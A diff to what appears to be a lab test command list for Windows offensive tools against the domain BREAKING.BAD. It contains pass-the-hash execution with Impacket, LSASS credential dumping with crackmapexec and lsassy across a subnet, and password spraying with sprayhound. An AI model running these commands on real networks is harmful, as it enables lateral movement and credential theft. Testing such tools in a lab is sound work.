@@ -39,9 +39,9 @@ wmiexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@
 atexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 dcomexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy
-cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True -o NEO4JUSER=neo4j -o NEO4JPASS=Somepassw0rd
+cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
 crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy
-crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True -o NEO4JUSER=neo4j -o NEO4JPASS=Somepassw0rd
+crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
 sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous -p 'azerty'
 sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous
 lsassy -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
